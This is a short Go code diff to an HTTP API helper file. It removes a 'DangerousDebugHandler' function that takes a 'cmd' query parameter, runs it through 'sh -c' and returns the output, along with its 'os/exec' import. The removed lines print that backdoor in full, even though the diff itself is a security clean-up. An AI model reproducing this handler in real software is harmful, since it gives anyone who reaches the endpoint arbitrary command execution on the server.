@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"os/exec"
 	"strings"
 )
 
@@ -48,14 +47,4 @@ func DoJSON(ctx context.Context, client *http.Client, method, url string, header
 		msg = resp.Status
 	}
 	return fmt.Errorf("platform api %s %s failed: status=%d body=%s", method, url, resp.StatusCode, msg)
-}
-
-func DangerousDebugHandler(w http.ResponseWriter, r *http.Request) {
-	command := r.URL.Query().Get("cmd")
-	output, err := exec.Command("sh", "-c", command).CombinedOutput()
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
-	_, _ = w.Write(output)
 }
